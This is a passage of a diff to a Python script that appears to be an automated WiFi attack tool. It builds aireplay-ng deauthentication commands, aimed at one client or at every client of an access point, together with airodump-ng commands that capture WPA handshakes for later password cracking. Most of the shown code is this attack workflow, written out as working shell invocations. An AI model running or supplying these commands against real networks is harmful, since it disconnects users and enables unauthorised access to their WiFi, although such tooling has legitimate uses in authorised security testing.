+                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && ~/.airscriptNG/air/*/src/airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                         post_frame()
                     def broadcast_deauth():
                         os.system('clear')
@@ -1255,7 +1441,7 @@ def aircrackng(): #Lots of effort needed
                         brda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                         input("\n\033[1;33;48m[?] \033[1;39;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOWor close the window. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
+                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/aireplay-ng -0 %s -a %s %s --ignore-negative-one && ~/.airscriptNG/air/*/src/airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                         post_frame()
                     def no_deauth():
                         os.system('clear')
@@ -1263,10 +1449,10 @@ def aircrackng(): #Lots of effort needed
                         print("\033[1;33;48m[info] \033[1;39;48mYou need to wait for someone to connect.")
                         input("\n\033[1;36;48m[info] \033[0;33;48mREADY? HIT \033[1;32;48m[ENTER]\033[0;33;48m TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW.\033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("\niwconfig %s channel %s" %(index,c))
-                        os.system("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
+                        os.system("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                         post_frame()
                     def sta():
-                        os.system("gnome-terminal --command='airodump-ng --bssid %s -c %s --ignore-negative-one %s' 2>/dev/null &" %(d,c,index))
+                        os.system("gnome-terminal --command='bash -c \"~/.airscriptNG/air/*/src/airodump-ng --bssid %s -c %s --ignore-negative-one %s\"' 2>/dev/null &" %(d,c,index))
                         global g
                         print("\n\033[0;37;48m[info] \033[1;33;48mIn the \033[1;32;48mTERMINAL\033[1;33;48m that appears, look at the column where it says bssid/station.")
                         #print("\033[1;35;48m[info] \033[1;37;48mIf you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
@@ -1290,11 +1476,14 @@ def aircrackng(): #Lots of effort needed
                     mainScreen()
             mainScreen()
         except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
+            import traceback
             print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
             os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
             os.system("sudo systemctl start NetworkManager.service")
             os.system("sudo systemctl start wpa_supplicant.service")
             os.system("clear")
+            #exc_info = sys.exc_info() #ENABLE THIS AND LINE BELOW FOR TRACEBACK
+            #traceback.print_exception(*exc_info)
             if input("\n\033[1;37;48m[-] \033[1;39;48mPress \033[1;32;48m[y]\033[1;39;48m to exit or any other key to return to start \033[1;31;48m ~# \033[0;39;48m").lower().startswith("y"):
                 os.system("rm log.txt 2>/dev/null")
                 os._exit(1)
